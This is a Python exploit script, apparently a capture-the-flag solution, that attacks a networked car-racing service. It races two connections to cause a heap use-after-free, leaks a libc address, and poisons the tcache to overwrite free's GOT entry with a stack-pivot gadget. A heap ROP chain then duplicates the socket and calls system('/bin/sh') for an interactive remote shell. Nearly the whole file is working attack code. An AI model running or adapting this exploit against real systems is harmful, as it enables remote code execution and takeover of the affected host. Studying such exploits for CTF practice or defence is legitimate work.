#!/usr/bin/python

# no pwntools here

import struct
import socket
import sys
import time
import os
import math
import telnetlib
import string

def p(f, *args):
    return struct.pack(f, *args)

p32 = lambda x: p("<I", x)
p64 = lambda x: p("<Q", x)

def u(f, v):
    return struct.unpack(f, v)

u32 = lambda x: u("<I", x.ljust(4, '\x00')[:4])[0]
u64 = lambda x: u("<Q", x.ljust(8, '\x00')[:8])[0]

def read_until(s, content, echo = True):
    x = ""
    while True:
        y = s.recv(1)
        if not y:
            return False
        x += y
        if x.endswith(content):
            if echo:
                sys.stderr.write(x)
            return x

def rl(s):
    return read_until(s, '\n')

def interact(s):
    t = telnetlib.Telnet()                                                            
    t.sock = s                                                                        
    t.interact() 

def add_car(s, racer_name, passengers, color, d, car_number, car_name_size, car_name):
    read_until(s, "????")
    s.send(p32(0xCCCCCCCC))
    s.send(racer_name.ljust(16, '\x00'))
    s.send(p64(passengers))
    s.send(color.ljust(16, '\x00'))
    s.send(d.ljust(100, '\x00'))   # speed struct
    s.send(p("<B", car_number & 0xff))
    s.send(p32(car_name_size))  # <= 0x1000
    s.send(car_name)  # can be smaller than name_size

# do everything but set the car name
def add_car_partial(s, racer_name, passengers, color, d, car_number, car_name_size):
    read_until(s, "????")
    s.send(p32(0xCCCCCCCC))
    s.send(racer_name.ljust(16, '\x00'))
    s.send(p64(passengers))
    s.send(color.ljust(16, '\x00'))
    s.send(d.ljust(100, '\x00'))   # speed struct
    s.send(p("<B", car_number & 0xff))
    s.send(p32(car_name_size))  # <= 0x1000
    
def print_racer(s, car_num):  # num == -1 == print all  
    read_until(s, "????")
    s.send(p32(0x11111111))
    read_until(s, "\n\n")
    s.send(p("<B", car_num & 0xff))
    return read_until(s, "\n\n")

def update_car_name(s, car_num, car_name_size, car_name):
    read_until(s, "????")
    s.send(p32(0xeeeeeeee))
    s.send(p("<B", car_num & 0xff))
    s.send(p32(0))
    s.send(p32(car_name_size))
    s.send(car_name)

def delete(s, car_num):
    read_until(s, "????")
    s.send(p32(0xdddddddd))
    s.send(p("<B", car_num & 0xff))

free_got = 0x603020

tgthost = sys.argv[1]
tgtport = int(sys.argv[2])

target = (tgthost, tgtport)

# need to threads to manage the race
t1 = socket.socket()
t1.connect(target)

# second thread
t2 = socket.socket()
t2.connect(target)

# add a car but wait to send the car name so we can win a race
add_car_partial(t1, "bob", 1, "blue", "\x01"*100, 10, 0x18)

# win the race
delete(t2, 10)   # name buffer for first car added to t2 tcache

# get a leak
# 1. allocate a name buffer that we'll free to the unsorted bin
add_car(t2, "bob", 1, "blue", "\x01"*100, 15, 0x800, "BBBBBBBB")
# 2. allocate at top to avoid cosolidation
add_car(t2, "bob", 1, "blue", "\x01"*100, 16, 0x400, "AAAAAAAA")

# this will free the 0x800 name buffer from step 1 above
# before giving it right back to us. We only overwrite the low
# byte of the remaining fw pointer
update_car_name(t2, 15, 0x800, "\x10")

# print the updated racer to leak the unsorted bin ptr
leak = print_racer(t2, 15)[:-2]
leak = u64(leak.split("Description: ")[1])

# compute some useful addresses
libc = leak - 0x3EBC10
system = libc + 0x4F440
binsh = libc + 0x1B3E9A
dup2 = libc + 0x1109A0
set_rdi = 0x4020E3
set_rsi = libc + 0x23E6a
ret = 0x4020E4

# gadget to pivot stack to our heap buffer
pivot = libc + 0x46c5e   # xchg    eax, esp / ret

# stick a rop chain in the heap, we'll pivot to it later
# rop chain to dup our socket before we get a shell
# we need to dup our sockect to 0,1,2 if we want a shell
rop = p("<15Q", set_rdi, 4, set_rsi, 2, dup2, set_rsi, 1, dup2, set_rsi, 0, dup2, ret, set_rdi, binsh, system)
update_car_name(t2, 16, 0x400, rop)

# Now finish creating our first car since the name field has been freed
# binary is not full relro so we'll hijack a got table entry
# get the address of free's got table entry onto the tail of thread 2's tcache 0x20 list
t1.send(p("<Q", free_got))

# This consumes the head of the tcache 0x20 list and advanced the
# head to the got entry we setup above
add_car(t2, "bob", 1, "blue", "\x01"*100, 11, 0x18, "A")

# now allocate ourselve a pointer to free's got entry from the tcache list
# and overwrite free's got entry to point to our pivot
add_car(t2, "dave", 1, "red", "\x01"*100, 12, 0x18, p64(pivot))
read_until(t2, "????")

# trigger a call to free our rop buffer, the free happens in thread 1
# so our shell will be in thread 1
update_car_name(t1, 16, 0x800, "\x10")

# talk to the shell - profit
interact(t1)

t1.close()
